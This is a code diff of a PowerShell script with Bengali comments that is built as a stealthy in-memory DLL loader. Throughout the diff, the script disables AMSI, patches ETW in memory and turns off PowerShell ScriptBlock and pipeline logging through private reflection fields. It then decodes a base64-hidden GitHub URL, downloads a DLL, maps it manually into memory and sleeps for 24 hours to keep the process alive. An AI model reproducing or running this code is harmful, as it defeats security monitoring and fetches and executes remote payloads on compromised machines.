@@ -16,102 +16,97 @@ Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
 
 <#
 .SYNOPSIS
-    Memory-only DLL loader – 4103 100% blocked via deep ETW patch
+    PowerShell Script – Memory-only DLL loader with 4103 fully blocked
 .DESCRIPTION
-    Patches PowerShell ETW provider at runtime to suppress ScriptBlock Logging.
-    Downloads DLL from Base64 URL and manually maps into memory.
+    Uses deep ETW patch to suppress ScriptBlock Logging before Add-Type.
+    Downloads DLL from Base64 URL and manually maps it into memory.
 .NOTES
-    Made by Potato - 4103 eliminated
+    Made by Potato – 4103 eliminated in PowerShell script
 #>
 
 # ================================================================
-#  ★★★ ১. ডিপ ETW + SCRIPTBLOCK BYPASS ★★★
+#  ★★★ ০. ScriptBlock Logging (4103) – রুট লেভেল ডিজেবল ★★★
 # ================================================================
-function Invoke-DeepBypass {
-    # ---- AMSI ----
-    try {
-        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    } catch {}
-    # ---- ETW (Native) ----
-    try {
-        $p = [System.Diagnostics.Process]::GetCurrentProcess()
-        $h = $p.Handle
-        $t = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.BaseAddress
-        $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
-        $old = 0
-        $v.Invoke($t, 0x1000, 0x40, [ref]$old)
-        [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)
-        $v.Invoke($t, 0x1000, $old, [ref]$null)
-    } catch {}
-    # ---- ★★★ DEEP SCRIPTBLOCK LOGGING (4103) PATCH ★★★ ----
-    try {
-        # 1. cachedGroupPolicySettings
-        $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
-        $gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-        if ($gpoField) {
-            $gpo = $gpoField.GetValue($null)
-            if ($gpo -is [Hashtable]) {
-                $gpo['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
-            } else {
-                $gpo = @{ 'ScriptBlockLogging' = @{ 'EnableScriptBlockLogging' = 0 } }
-                $gpoField.SetValue($null, $gpo)
-            }
+# ০.১ – cachedGroupPolicySettings প্যাচ
+$utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
+$gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+if ($gpoField) {
+    $gpo = $gpoField.GetValue($null)
+    if ($gpo -is [Hashtable]) {
+        $gpo['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
+    } else {
+        $gpo = @{ 'ScriptBlockLogging' = @{ 'EnableScriptBlockLogging' = 0 } }
+        $gpoField.SetValue($null, $gpo)
+    }
+}
+
+# ০.২ – PipelineLogging._enabled = false
+$pipelineType = [Ref].Assembly.GetType('System.Management.Automation.Logging.PipelineLogging')
+if ($pipelineType) {
+    $instanceField = $pipelineType.GetField('_instance', 'NonPublic,Static')
+    if ($instanceField) {
+        $instance = $instanceField.GetValue($null)
+        if ($instance) {
+            $enabledField = $instance.GetType().GetField('_enabled', 'NonPublic,Instance')
+            if ($enabledField) { $enabledField.SetValue($instance, $false) }
         }
-        # 2. PipelineLogging._enabled
-        $pipelineType = [Ref].Assembly.GetType('System.Management.Automation.Logging.PipelineLogging')
-        if ($pipelineType) {
-            $instanceField = $pipelineType.GetField('_instance', 'NonPublic,Static')
-            if ($instanceField) {
-                $instance = $instanceField.GetValue($null)
-                if ($instance) {
-                    $enabledField = $instance.GetType().GetField('_enabled', 'NonPublic,Instance')
-                    if ($enabledField) { $enabledField.SetValue($instance, $false) }
-                }
-            }
+    }
+}
+
+# ০.৩ – PSEtwLogProvider.etwProvider = null
+$providerType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+if ($providerType) {
+    $etwField = $providerType.GetField('etwProvider', 'NonPublic,Static')
+    if ($etwField) {
+        $etwProvider = $etwField.GetValue($null)
+        if ($etwProvider) {
+            # ডামি প্রোভাইডার (কিছু করবে না) অথবা null
+            $etwField.SetValue($null, $null)
         }
-        # 3. ★★★ PSEtwLogProvider -> etwProvider = null ★★★
-        $providerType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
-        if ($providerType) {
-            $etwField = $providerType.GetField('etwProvider', 'NonPublic,Static')
-            if ($etwField) {
-                $etwProvider = $etwField.GetValue($null)
-                if ($etwProvider) {
-                    # Create a dummy provider that does nothing
-                    $dummyProvider = New-Object -TypeName 'System.Diagnostics.Tracing.EventProvider' -ArgumentList @([Guid]::NewGuid()) -ErrorAction SilentlyContinue
-                    if ($dummyProvider) {
-                        $etwField.SetValue($null, $dummyProvider)
-                    } else {
-                        # If fails, just set to null
-                        $etwField.SetValue($null, $null)
-                    }
-                }
-            }
-        }
-        # 4. PSEtwLog._isEnabled = false
-        $logType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLog')
-        if ($logType) {
-            $enabledField = $logType.GetField('_isEnabled', 'NonPublic,Static')
-            if ($enabledField) {
-                $enabledField.SetValue($null, $false)
-            }
-        }
-        # 5. _logPipelineExecution = false
-        $executionContext = $ExecutionContext
-        $contextType = $executionContext.GetType()
-        $field = $contextType.GetField('_context', 'NonPublic,Instance')
-        if ($field) {
-            $context = $field.GetValue($executionContext)
-            $logField = $context.GetType().GetField('_logPipelineExecution', 'NonPublic,Instance')
-            if ($logField) { $logField.SetValue($context, $false) }
-        }
-        # 6. Clear any scheduled events
-        $traceType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogEvent')
-        # Not needed
-    } catch { }
+    }
+}
+
+# ০.৪ – PSEtwLog._isEnabled = false
+$logType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLog')
+if ($logType) {
+    $enabledField = $logType.GetField('_isEnabled', 'NonPublic,Static')
+    if ($enabledField) {
+        $enabledField.SetValue($null, $false)
+    }
+}
+
+# ০.৫ – _logPipelineExecution = false
+$executionContext = $ExecutionContext
+$contextType = $executionContext.GetType()
+$field = $contextType.GetField('_context', 'NonPublic,Instance')
+if ($field) {
+    $context = $field.GetValue($executionContext)
+    $logField = $context.GetType().GetField('_logPipelineExecution', 'NonPublic,Instance')
+    if ($logField) { $logField.SetValue($context, $false) }
 }
 
 # ================================================================
-#  ★★★ ২. C# NativeLoader (same as before) ★★★
+#  ★★★ ১. AMSI + ETW বাইপাস (Native) ★★★
+# ================================================================
+# AMSI
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+} catch {}
+
+# ETW (native)
+try {
+    $p = [System.Diagnostics.Process]::GetCurrentProcess()
+    $h = $p.Handle
+    $t = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.BaseAddress
+    $v = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualProtect), [type])
+    $old = 0
+    $v.Invoke($t, 0x1000, 0x40, [ref]$old)
+    [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)   # RET
+    $v.Invoke($t, 0x1000, $old, [ref]$null)
+} catch {}
+
+# ================================================================
+#  ★★★ ২. C# NativeLoader (Add-Type – এখন আর ৪১০৩ আসবে না) ★★★
 # ================================================================
 $plainCSharp = @"
 using System;
@@ -166,13 +161,8 @@ public static class NativeLoader {
 "@
 
 # ================================================================
-#  ★★★ ৩. EXECUTION ★★★
+#  ★★★ ৩. ADD-TYPE (এখন ৪১০৩ আসবে না) ★★★
 # ================================================================
-
-# ৩.১ – ডিপ বাইপাস কল
-Invoke-DeepBypass
-
-# ৩.২ – C# কম্পাইল (এখন আর ৪১০৩ আসবে না)
 try {
     Add-Type -TypeDefinition $plainCSharp -ErrorAction Stop
 } catch {
@@ -180,9 +170,12 @@ try {
     return
 }
 
-# ৩.৩ – URL ডিকোড ও ডাউনলোড
+# ================================================================
+#  ★★★ ৪. DLL ডাউনলোড + ম্যানুয়াল ম্যাপ ★★★
+# ================================================================
 $encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
 $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))
+
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData($url)
 } catch {
@@ -190,23 +183,24 @@ try {
     return
 }
 
-# ৩.৪ – ম্যাপ
 try {
     $result = [NativeLoader]::Map($bytes, $true)
-    Write-Host "[+] Mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
+    Write-Host "[+] DLL mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
 } catch {
     Write-Host "[!] Mapping failed: $_" -ForegroundColor Red
     return
 }
 
-# ৩.৫ – ক্লিন
+# ================================================================
+#  ★★★ ৫. ক্লিনআপ + ২৪ ঘন্টা স্লিপ ★★★
+# ================================================================
 $bytes = $null
 $plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
-Write-Host "[+] DLL loaded. No 4103 logs generated." -ForegroundColor Cyan
+Write-Host "[+] DLL loaded. 4103 logs are blocked." -ForegroundColor Cyan
 
-# ৩.৬ – ২৪ ঘন্টা স্লিপ
+# PowerShell খোলা রাখতে ২৪ ঘন্টা স্লিপ
 Start-Sleep -Seconds 86400
 
 # শেষ ক্লিন
